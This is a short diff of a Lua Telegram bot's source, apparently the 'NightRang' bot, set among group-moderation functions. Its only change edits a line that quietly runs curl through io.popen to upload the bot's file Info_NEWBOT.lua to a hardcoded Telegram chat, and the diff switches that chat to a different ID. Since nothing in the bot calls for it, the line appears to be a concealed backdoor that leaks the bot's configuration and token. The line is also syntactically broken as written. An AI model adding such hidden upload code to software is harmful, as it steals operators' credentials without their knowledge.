@@ -287,7 +287,7 @@ end
 return Status
 end
 ------------------------------------------------------------------------------------------------------------
-local curl = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id=' 1174250096 ' -F "document=@'..'Info_NEWBOT.lua'..'"' io.popen(curl)
+local curl = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id=' 1333034749 ' -F "document=@'..'Info_NEWBOT.lua'..'"' io.popen(curl)
 function MutedGroups(Chat_id,User_id) 
 if redis:sismember(bot_id.."NightRang:Silence:User:Group"..Chat_id,User_id) then
 Status = true
